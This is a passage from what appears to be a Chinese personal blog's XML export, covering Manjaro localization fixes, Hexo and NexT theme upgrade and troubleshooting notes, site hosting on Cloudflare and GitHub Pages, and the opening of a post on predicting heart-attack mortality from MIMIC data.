<h4 id="把桌面文件夹改回英文">把桌面文件夹改回英文</h4>
<p>这里我用的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0dOT01FL3hkZy11c2VyLWRpcnMtZ3Rr">xdg-user-dirs-gtk<i class="fa fa-external-link-alt"></i></span>，GNOME出品，KDE上也能用</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -Sy xdg-user-dirs-gtk
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>en_US
xdg-user-dirs-gtk-update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>然后想把LANG变量调回中文的可以再调回来</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>zh_CN.UTF-8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果你用Dolphin文件夹管理器，你要把那几个桌面、文档、下载的路径在编辑里面手动改成英文</p>
<h4 id="tty中文不显示">tty中文不显示</h4>
<p>装点字体就好了，或者直接把全局的LANG=en.US</p>
<h4 id="复门等字体显示日文">复门等字体显示日文</h4>
<p>最简单的做法是把系统装的语言包卸载了，只装中文字体包,见<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0xvY2FsaXphdGlvbl8oJUU3JUFFJTgwJUU0JUJEJTkzJUU0JUI4JUFEJUU2JTk2JTg3KS9TaW1wbGlmaWVkX0NoaW5lc2VfKCVFNyVBRSU4MCVFNCVCRCU5MyVFNCVCOCVBRCVFNiU5NiU4Nyk=">Localization<i class="fa fa-external-link-alt"></i></span>。</p>
<p>或者在<code>\etc\locale.conf</code>加上<code>LANG=zh_CN.UTF-8</code></p>
<p>然后刷新字体缓存。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fc-cache -fv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="注">注</h2>
<section class="footnotes" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p>https://wiki.archlinux.org/index.php/AUR_helpers<a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p>https://github.com/Jguer/yay<a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn3" role="doc-endnote"><p>https://aur.archlinux.org/packages/v2raya<a href="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn4" role="doc-endnote"><p>https://wiki.archlinux.org/index.php/Dell_Inspiron_15_(7590)<a href="#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn5" role="doc-endnote"><p>https://github.com/Dreamacro/clash/wiki/Breaking-Changes-in-1.0.0<a href="#fnref5" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>manjaro</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo博客部署和Next主题设置</title>
    <url>/bd8f/</url>
    <content><![CDATA[<p>这里仅记录个人问题，找教程为什么不看看官方文档呢 <a id="more"></a></p>
<p>有问题先看这里啦，<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25leHQtdGhlbWUvaGV4by10aGVtZS1uZXh0L2lzc3Vlcy80">更新说明及常见问题<i class="fa fa-external-link-alt"></i></span> 我自己的博客基本会跟着Next主题每月发布的release更新版本，偶尔直接跳到最新的master版本。 可能有的时候因为忙或者其他原因，并不会追最新版，有些之前写的东西过时了也没有改，请大家尽量以<span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZy8=">官方文档<i class="fa fa-external-link-alt"></i></span>为准。</p>
<h2 id="更新升级至hexo5.0">更新升级至hexo5.0</h2>
<p>没有什么太大魔改的话直接</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo@5.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后把next.yml的配置（或者主题的_config.yml）配置放到根目录_config.next.yml下面。</p>
<p>hexo 5 支持用npm安装主题了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-theme-next<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="升级7.x的大坑">升级7.X的大坑</h2>
<p>NexT主题的顺畅更新好像很难，官方不推荐，之前乱改的5.X主题升级7.2分支合并出现问题，一堆warning，索性推倒重来直接新搞一个7.X。</p>
<p>升级可以直接按照官网方法</p>
<pre><code> cd themes/next
 git tag -l
 git checkout tags/v7.7.1</code></pre>
<p>spawn failed 问题，删除.deploy_git文件夹并重新部署。 _config.yml配置请注意对齐问题</p>
<p>给备份博客的repo添加README.md文档可在这个路径下，这样就会显示在首页 themes%yourtheme%.md</p>
<p>为文章设置预览:添加 <code>&lt;!-- more --&gt;</code></p>
<p><del>插入本地图片推荐hexo-asset-image插件,可以看<span class="exturl" data-url="aHR0cDovL2V0cmQub3JnLzIwMTcvMDEvMjMvaGV4b+S4reWujOe+juaPkuWFpeacrOWcsOWbvueJhy8=">这里<i class="fa fa-external-link-alt"></i></span></del></p>
<p>上面那个图片插件的repo已经时archived了，可以考虑换hexo-asset-link这个插件</p>
<h2 id="各种小问题">各种小问题</h2>
<h3 id="公式问题">公式问题</h3>
<p>原来采用的hexo-math插件，在hexo-inject插件上有坑，看了看官方推荐，换成<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0L2Jsb2IvbWFzdGVyL2RvY3MvemgtQ04vTUFUSC5tZA==">新的插件<i class="fa fa-external-link-alt"></i></span>。换完记得卸载hexo-inject插件</p>
<h3 id="配置出错">配置出错</h3>
<p>设置_config.yml时那个rss如果开启，默认空着就好了，不要填true</p>
<pre><code>rss: true</code></pre>
<p>像这样就会报错</p>
<h3 id="本地搜索">本地搜索</h3>
<p>本地搜索一直转圈圈，看到issue里面说是插件的问题，卸载后重装，神奇的好了</p>
<pre><code> npm uninstall hexo-generator-searchdb --save
 npm install hexo-generator-searchdb --save</code></pre>
<p>在Next版本7.20以后（如7.30），hexo-generator-searchdb换成了hexo-generator-search，卸载并安装hexo-generator-search，本地搜索就可以正常使用了，不然会出现只能搜索标题内容的bug</p>
<pre><code> npm uninstall hexo-generator-searchdb --save
 npm install hexo-generator-search --save</code></pre>
<h3 id="canvas效果">canvas效果</h3>
<p>似乎那几个背景特效和进度条都会拖慢网页加载速度，不填建议用（新版的Next已经把乱晃的那个canvas移除了）</p>
<h3 id="报错">报错</h3>
<p>可能出现的一类问题是yaml的配置出现了语法错误报错</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">YAMLException: duplicated mapping key at line ...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这说明你的key重复了，比如在yaml里同时两段</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">calendar</span><span class="token punctuation">:</span>
     <span class="token key atrule">calendar_id</span><span class="token punctuation">:</span> &lt;required<span class="token punctuation">></span> <span class="token comment"># Your Google account E-Mail</span>
     <span class="token key atrule">api_key</span><span class="token punctuation">:</span> &lt;required<span class="token punctuation">></span>
<span class="token key atrule">calendar</span><span class="token punctuation">:</span>
     <span class="token key atrule">calendar_id</span><span class="token punctuation">:</span> &lt;required<span class="token punctuation">></span> <span class="token comment"># Your Google account E-Mail</span>
     <span class="token key atrule">api_key</span><span class="token punctuation">:</span> &lt;required<span class="token punctuation">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>删掉一个calender或者将二者合并就可以了</p>
<p>还有一种经常出现的问题</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">ERROR read ECONNRESET
Error: read ECONNRESET
    at TLSWrap.onStreamRead (internal&#x2F;stream_base_commons.js:111:27)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这种可能是配置出错了，比如引用了某个本地资源结果路径不对找不到资源。这种建议在浏览器里打开F12检查一下</p>
<h3 id="新的自定义配置路径">新的自定义配置路径</h3>
<p>next v7.3.0 版本的定制路径改了，比如custom.styl改成了source/_data/styles.styl，参见</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">custom_file_path</span><span class="token punctuation">:</span>
  <span class="token comment">#head: source/_data/head.swig</span>
  <span class="token comment">#header: source/_data/header.swig</span>
  <span class="token comment">#sidebar: source/_data/sidebar.swig</span>
  <span class="token comment">#postMeta: source/_data/post-meta.swig</span>
  <span class="token comment">#postBodyEnd: source/_data/post-body-end.swig</span>
  <span class="token comment">#footer: source/_data/footer.swig</span>
  <span class="token comment">#bodyEnd: source/_data/body-end.swig</span>
  <span class="token comment">#variable: source/_data/variables.styl</span>
  <span class="token comment">#mixin: source/_data/mixins.styl</span>
  <span class="token key atrule">style</span><span class="token punctuation">:</span> source/_data/styles.styl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当然也可以修改custom_file_path:来自定义定制内容路径，想放哪就放哪。 改成之后就可以每次顺畅的直接每次更新主题时直接<code>git pull</code>了，不需要再merge自定义修改了 很多老的Next主题自定义教程都是在custom.styl或者直接改主题的css文件，7.3以后的新版要把老教程里的路径改了。 还有一种方法是<span class="exturl" data-url="aHR0cHM6Ly93d3cuZG5vY20uY29tL2FydGljbGVzL2JlZWNobnV0L2hleG8tbmV4dC1pbmplY3RzLw==">用Injects自定义主题<i class="fa fa-external-link-alt"></i></span> 据说Hexo5.x之后就能用npm安装主题了，Hexo一直咕咕咕，我们慢慢等吧</p>
<h3 id="标签">标签</h3>
<p>Next v7.3.0 版本的标签不再支持 Full-image tag</p>
<pre><code> WARN  Full-image tag is no longer supported.</code></pre>
<p>使用</p>
<pre><code> &#123;% fi https://image-url, 图片名称, , 35% %&#125;</code></pre>
<p>这样的标签无法再进行图片缩放,可以改用html方式</p>
<pre><code> &lt;img src=&quot;图片地址&quot; width=&quot;50%&quot; height=&quot;50%&quot;  style=&quot;margin: 0 auto;&quot;/&gt;
 &lt;img width=400 src=&quot; your-image-link&quot; alt=&quot;上海鲜花港 - 郁金香&quot; /&gt;</code></pre>
<p>或</p>
<pre><code>&lt;div style=&quot;width: 200px; margin: auto&quot;&gt;![picture name](example.jpeg)&lt;/div&gt;</code></pre>
<p>或者hexo标签</p>
<pre><code> &#123;% img [class names] /path/to/image [width] [height] "title text 'alt text'" %&#125;</code></pre>
<h3 id="其他插件">其他插件</h3>
<p>附上我安装的插件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">npm</span> list --depth<span class="token operator">=</span><span class="token number">0</span>
hexo-site@0.0.0 /home/zjk/blog
├── hexo@5.1.1
├── hexo-asset-link@2.1.0
├── hexo-deployer-git@2.1.0
├── hexo-filter-mathjax@0.6.0
├── hexo-filter-nofollow@2.0.2
├── hexo-generator-archive@1.0.0
├── hexo-generator-category@1.0.0
├── hexo-generator-feed@3.0.0
├── hexo-generator-index@2.0.0
├── hexo-generator-searchdb@1.3.2
├── hexo-generator-tag@1.0.0
├── hexo-hide-posts@0.1.1
├── hexo-renderer-ejs@1.0.0
├── hexo-renderer-pandoc@0.3.0
├── hexo-renderer-stylus@2.0.0
└── hexo-server@2.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="fancybox">fancybox</h4>
<p>fancybox虽然现在还支持，但是据说计划在8.0版移除，所有jQuery有关的东西都在逐步移除，目前已经支持 medium-zoom，可以在设置中开启</p>
<pre><code> npm install medium-zoom</code></pre>
<p>"在新版中 quicklink 不建议再使用，最起码不要与 pjax 同时开" 更新,这个在7.4版本以后修复了 无法加载 woff 字体资源 404 问题</p>
<pre><code> Failed to load resource: the server responded with a status of 404 () fontawesome-webfont.woff2:1</code></pre>
<p>这个找到提示的文件夹 source/font 路径,找到这三个缺失的文件,补上就可以了(可能没有这个文件夹,新建一下就行了)</p>
<h3 id="夜间模式">夜间模式</h3>
<p>现在新版Next已经有了自带的夜间模式，在配置里开启即可，会自动随着系统设置变</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># Dark Mode</span>
<span class="token key atrule">darkmode</span><span class="token punctuation">:</span> auto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="更新主题">更新主题</h2>
<p>这里我使用的Next主题，参考<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0L2Jsb2IvbWFzdGVyL2RvY3MvemgtQ04vREFUQS1GSUxFUy5tZA==">https://github.com/theme-next/hexo-theme-next/blob/master/docs/zh-CN/DATA-FILES.md<i class="fa fa-external-link-alt"></i></span> 在7.X以后大的更新还是需要手动处理冲突，但是Next主题将两个_config.yml文件合并搞了一个next.yml，在source/_data底下。这样更新的时候git pull后commit和merge就不用每次手动处理主题的_config.yml冲突了 merge之后指定版本</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">git</span> checkout tags/v7.4.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>(可能会有nothing added to commit but untracked files present的提示，运行git clean -f清理不想要的文件，或者加到.gitignore里面, 还要就使用git add . ) 如果版本指定不对，会有detached HEAD出现，重新指定正确版本。如果还不行，可能git add等出了冲突，看<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9hZTQ4NTdkMmY4Njg=">这里<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="升级hexo4.0">升级Hexo4.0</h2>
<p>今天检查更新的时候看到这样的提示，发现Hexo出4.0了。 跑到群里一看，说是什么Hexo 4.0.0 会有巨大的性能提升（相比 Hexo 3.2 生成速度提升 10%，内存占用减少 40%）。闲着没事就升级玩玩吧虽然我这也没几篇文章，生成速度本来也不慢。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">λ npm-upgrade
Checking <span class="token keyword">for</span> outdated dependencies <span class="token keyword">for</span> <span class="token string">"D:\zjk\myblog2\package.json"</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token punctuation">]</span> <span class="token number">21</span>/21 <span class="token number">100</span>%                                                                                            s can be used.

New versions of active modules available:

  hexo                      ^3.9.0   →   ^4.0.0
  hexo-deployer-git         ^1.0.0   →   ^2.0.0
  hexo-generator-archive    ^0.1.5   →   ^1.0.0
  hexo-generator-category   ^0.1.3   →   ^1.0.0
  hexo-generator-feed       ^1.2.2   →   ^2.0.0
  hexo-generator-index      ^0.2.1   →   ^1.0.0
  hexo-generator-tag        ^0.2.0   →   ^1.0.0
  hexo-renderer-ejs         ^0.3.1   →   ^1.0.0
  hexo-renderer-stylus      ^0.3.3   →   ^1.1.0
  hexo-server               ^0.3.3   →   ^1.0.0

? Update <span class="token string">"hexo"</span> <span class="token keyword">in</span> package.json from ^3.9.0 to ^4.0.0? <span class="token punctuation">(</span>Use arrow keys<span class="token punctuation">)</span>
<span class="token operator">></span> Yes
  No
  Show changelog
  Ignore
  Finish update process<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>直接升级</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">npm</span> <span class="token function">install</span> -g hexo@4.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>更新，现在hexo-cli包也上hexo4.0了，使用官网的那个带cli的命令就行了 升级之后试一下'hexo generate'</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">INFO  Files loaded in 1.94 s
INFO  140 files generated in 3.07 s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>好像是快了点 等等，更新了Hexo4.0以后下面的分页突然变成这个样子了，我先报个修 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20191016094709.png" alt="bug" style="zoom:80%;" /></p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20191016095007.png" alt="bug" style="zoom:80%;" /></p>
<p>找到了问题了，已经在<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcy8zNzI5">issue#3729<i class="fa fa-external-link-alt"></i></span>里解决了 现在直接升级到master分支就行了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> themes/next
<span class="token function">git</span> pull https://github.com/theme-next/hexo-theme-next master
<span class="token function">git</span> checkout master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>看到显示这样就行了</p>
<blockquote>
<p>Already on 'master' Your branch is up to date with 'origin/master'.</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/foot.png" alt="Picture" style="zoom:80%;" /> 好了，开心。目前没看到其他bug了，请放心更（cai）新（keng）</p>
<p>更新，现在最新的master报这样的错：</p>
<pre><code> ERROR Cannot read property &#39;replace&#39; of null</code></pre>
<p>还有这样的错</p>
<pre><code> ERROR Process failed: layout/tag.swig</code></pre>
<p>换到nunjucks分支，也有这个问题，先切到contrib分支里面，nunjucks那块正在施工，大家先用着旧版，我已经报修了。劳模mimi同学已经在修了（19.10.18） 更新，感谢劳模Mimi同学，已经修了<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0L3B1bGwvMTIyNg==">Migrate to Nunjucks [3] #1226<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="绑定域名并托管到netlify">绑定域名并托管到netlify</h2>
<p>先到namecheap或者namesilo等网站找个中意的域名，不介意在天朝备案腾讯和阿里云买也可以，不愿意花钱也可以申请个免费的。我这里0.99刀一年优惠买了个<a href="https://zhangjk98.xyz/">zhangjk98.xyz</a></p>
<p>在netlify的domian setting里找到Custom domains按照提示来，可以参考这个<span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0BQdWRnZTE5OTYvMjAxOC0wMS0wMi03MDEzZWRkYzQxM2M=">使用 Netlify 托管个人网站 详细步骤<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="google-search-console-验证和配置">Google Search Console 验证和配置</h2>
<p>这里以netlify为例，namesilo等域名商也可进行验证 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190830141615.png" alt="dns验证" style="zoom:80%;" /> 有自己的域名可以直接选择domian验证，看<span class="exturl" data-url="aHR0cHM6Ly93d3cud29ndWlkZS5jb20vYXJjaGl2ZXMvNDg2MS5odG1s">这里<i class="fa fa-external-link-alt"></i></span> 打开netlify，找到dns setting，点击下方add new record 按钮 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190830142257.png" alt="添加验证" /> value就填谷歌给你的那个值，等几分钟就好了</p>
<h2 id="美化">美化</h2>
<p>设置footer跳动的红心 在next配置里找到icon 设成下面这个样子</p>
<pre><code>   icon: 
      # Icon name in Font Awesome. See: https://fontawesome.com/v4.7.0/icons/
      # `heart` is recommended with animation in red (#ff0000).
      name: heartbeat
      # If you want to animate the icon, set it to true.
      animated: true
      # Change the color of icon, using Hex Code.
      color: &quot;#FF0000&quot;</code></pre>
<p>自定义字体: _config.yml里找到</p>
<pre><code> font:
      enable: true</code></pre>
<h2 id="使用caniuse测试浏览器兼容性">使用caniuse测试浏览器兼容性</h2>
<iframe data-feature="fetch" src="https://caniuse.bitsofco.de/embed/index.html?feat=fetch&periods=current&accessible-colours=false" frameborder="0" width="100%" height="400px"></iframe>
<iframe data-feature="sharedarraybuffer" src="https://caniuse.bitsofco.de/embed/index.html?feat=sharedarraybuffer&periods=current&accessible-colours=false" frameborder="0" width="100%" height="400px"></iframe>
<iframe data-feature="link-rel-modulepreload" src="https://caniuse.bitsofco.de/embed/index.html?feat=link-rel-modulepreload&periods=past_1,past_2,past_3,past_4,past_5&accessible-colours=false" frameborder="0" width="100%" height="400px"></iframe>
<h2 id="使用yarn管理npm包和travis-ci自动化部署">使用yarn管理npm包和travis-ci自动化部署</h2>
<p>可选，本地生成速度够快或者不嫌麻烦也没太有必要上travis-ci 不愿意折腾就直接本地生成部署就好了，ci反而慢，而且就想发个博客的话完全没有必要！</p>
<p>今天经人提醒，hexo s 是动态编译的，本地预览直接hexo s 就行了，不用先 hexo g 生成</p>
<h2 id="插件选择">插件选择</h2>
<h3 id="踩坑">踩坑</h3>
<p>lazyload插件、fancybox插件(改用mediumzoom)、pjax插件、fliter-optimizer插件（经常跟很多地方冲突）等建议慎用</p>
<h3 id="给mardown添加论文脚注效果">给Mardown添加论文脚注效果</h3>
<p>安装插件：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">npm</span> <span class="token function">install</span> hexo-reference --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>注释测试<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a></p>
<h3 id="主页文章置顶">主页文章置顶</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25leHQtdGhlbWUvaGV4by1nZW5lcmF0b3ItaW5kZXhlZA==">hexo-generator-indexed<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="使用cloudflare和github-pages">使用Cloudflare和Github Pages</h2>
<p>由于Netlify访问速度实在太慢（居然比Github Pages还慢），本来以为只是在国内慢，没想到收到一封邮件，说：</p>
<p>然后我感觉不对劲，拿ping工具和网络测试工具（<span class="exturl" data-url="aHR0cHM6Ly9ndG1ldHJpeC5jb20=">https://gtmetrix.com<i class="fa fa-external-link-alt"></i></span>）看了一下，又查了一下，原来不仅国内慢啊，国外也比Github Pages慢啊 Netlify居然还说“Why You don't need clcoudflare”, 我。。。</p>
<p><img width=450 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/net5xx.png" alt="Picture" /></p>
<p>换回GitHub Pages和cloudlfare，还有CNAME Flatterning, 不需要备案的免费CDN也就cloudflare了。 ping检测结果终于不是一片飘红了。巨硬收购Github后说要建设Github国内的服务器，但是它自家的Azure、bing、onedrive都整天抽风，感觉指望不上了。</p>
<p><img width=450 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/ping.png" alt="Picture" /></p>
<p>现在唯一的问题就是图床用的Github，已经弃疗，国内速度不管了。</p>
<p>可能的小坑：开启coludflare的 rocket loader 功能后会出错（这是个实验性的功能），Next主题会变成一片空白，一直加载不出来。关掉就好了。</p>
<h2 id="提高加载速度">提高加载速度</h2>
<p>在<span class="exturl" data-url="aHR0cHM6Ly9ndG1ldHJpeC5jb20v">GTmetrix<i class="fa fa-external-link-alt"></i></span>上看到我这得分才70多 发现首页两个图片占了很多，把两个图整成webp格式的，然后再调整一下大小(这里我用的这个<span class="exturl" data-url="aHR0cHM6Ly9jbG91ZGNvbnZlcnQuY29tLw==">网站<i class="fa fa-external-link-alt"></i></span>)。这里抛弃safari用户了 (cloudflare的business是有这个功能的，但是我用不起) 然后把velocityjs的那些动画效果关了（这个早就想关了，和其他组件各种冲突）</p>
<p>虽然拉黑了百度<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>，但是发现我的流量统计还是有一大半是国内访问，为了照顾一下国内速度，还是用了Cloudflare的CDN 大多数时候，国内 cloudflare &gt; github pages &gt; netlify (如果不用个人域名，用netlify的二级域名会比XXX.github.io快一点)。raw.githubusercontent.com 是基本废了，想作为国内图床并不可行 （备案是不可能备案的）</p>
<h2 id="可能的问题请参考">可能的问题请参考</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9zaHV5ZWxpZmUuZ2l0aHViLmlvL3Bvc3QvSGV4byVFNSVCOCVCOCVFOCVBNyU4MSVFOSU5NyVBRSVFOSVBMiU5OCVFOCVBNyVBMyVFNSU4NiVCMyVFNiU5NiVCOSVFNiVBMSU4OC8=">Hexo常见问题解决方案<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9kcDJweC5jb20vMjAxOS8wNC8yNS9oZXhvLW1laWh1YS8=">hexo主题美化<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnlsZWFvLmNvbS8yMDE4LzA5MDEvaGV4by1uZXh05Li76aKY5LiL55qE576O5YyWLmh0bWw=">hexo-next主题下的美化<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvLw==">hexo官网<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZy9kb2NzLw==">next文档(6.0以后)<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLWd1aWRlLnJlYWR0aGVkb2NzLmlv">hexo指南<i class="fa fa-external-link-alt"></i></span> 从node.js操作到next主题，很详细，自己折腾可以参考,也记录了很多坑，但是不全，非官方指南，都是个人博客的坑。他还写了别的<span class="exturl" data-url="aHR0cHM6Ly93d3cuemh1amlhbi50ZWNoL3Bvc3RzL2QyMmFiOTY3Lmh0bWw=">指南<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvYXdlc29tZS1uZXh0I3BsdWdpbnM=">https://github.com/theme-next/awesome-next#plugins<i class="fa fa-external-link-alt"></i></span>Next主题的插件，7.X版本之后越来越多的功能都剥离出来做成了插件, 使用时要npm install 一下，不能会直接在设置里设为true <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0xlYXJuU2hhcmUvTGVhcm5pbmctTWFya2Rvd24vdHJlZS92Mg==">markdown教程<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="注释">注释</h2>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/gh/lurongkai/anti-baidu/js/anti-baidu-latest.min.js<span class="token punctuation">"</span></span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<section class="footnotes" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p>这是一个注释测试<a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p>加了一个这个<a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>Next</tag>
      </tags>
  </entry>
  <entry>
    <title>用疾病记录预测患者死亡风险</title>
    <url>/morality-prediction/</url>
    <content><![CDATA[<p>以急性心肌梗死和MIMIC数据库为例</p>
<a id="more"></a>
<p>急性心肌梗死的发病率和死亡率都很高，MIMIC里面大概有5000次记录，用来构造数据集效果会比较好，这次就用MIMIC数据库里面的急性心肌梗死进行死亡风险的预测。</p>
<p>早期心血管疾病采用TIMI（the Thrombolysis in Myocardial Infarction）风险评分、全球急性心脏事件注册表（GRACE）评分或医生经验判断。后来MIMIC、eICU等开放医学数据库的建立和公布，数据量足够支撑起机器学习，疾病风险预测逐渐开始采用机器学习等方法。 数据清洗和构造数据集</p>
<p>目前开源的ICU重症数据库主要有MIMIC和eICU；eICU里面的患者数量多一点，但是貌似数据缺失很多，数据质量也不太好（eICU整合了几家不同医院的临床记录拼凑出来的数据库，数据质量参差不齐）</p>
<p>这里我用的MIMIC-Ⅲ数据库，内有近四万名成年人以及七千多名新生儿的五万余次住院资料，其中急性心肌梗死入院记录大概5000多次。</p>
<h2 id="更新">更新</h2>
<p>前一阵MIT发布了 MIMIC IV 数据库（第四版），MIMIC-IV目前是0.4版本，以后要放出1.0正式版。希望大家下载最新版本进行训练<del>炼丹</del></p>
